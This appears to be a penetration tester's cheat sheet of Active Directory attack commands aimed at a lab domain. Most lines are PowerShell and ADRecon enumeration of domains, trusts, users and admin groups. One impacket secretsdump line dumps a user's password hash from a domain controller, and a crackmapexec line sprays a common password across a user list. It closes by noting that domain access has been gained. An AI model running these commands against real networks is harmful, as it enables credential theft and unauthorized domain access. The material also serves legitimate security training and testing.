$env:userdnsdomain

(Get-ADDomain).DNSRoot

(Get-WmiObject Win32_ComputerSystem).Domain

Get-ADDomain | select DNSRoot, NetBIOSName, DomainSID

Get-ADForest

(Get-ADForest).ForestMode

(Get-ADDomain).DomainMode

nltest /domain_trusts

Get-ADUser Anakin

secretdump.py 'contoso.local/administrator@192.168.100.2' -just-dc-user anakin

Get-ADUser -Filter * | select SamAccountName

Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName

Get-ADUser -LDAPFilter "(SamAccountName = *$)" | select SamAccountName

Get-NetGroup -GroupName "Domain Admins" -FullData

## Examples
#To run ADRecon on a domain member host.

ADRecon.ps1

#To run ADRecon on a domain member host as a different user.

.\ADRecon.ps1 -DomainController 192.168.1.6 -Credential victim@lethallab.local

#To run ADRecon on a non-member host using LDAP.

.\ADRecon.ps1 -Protocol LDAP -DomainController 192.168.1.6 -Credential victim@lethallab.local

#To run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)

.\ADRecon.ps1 -Protocol ADWS -DomainController 192.168.1.6 -Credential victim@lethallab.local -Collect Domain, DomainControllers

#To generate the ADRecon-Report.xlsx based on ADRecon output (CSV Files).

.\ADRecon.ps1 -GenExcel C:\ADRecon-Report-<timestamp>

#Linux Side
crackmapexec smb 192.168.1.16 -u users.txt -p Password1 --continue-on-success
#great now we can authenticate to the Windows domain environment


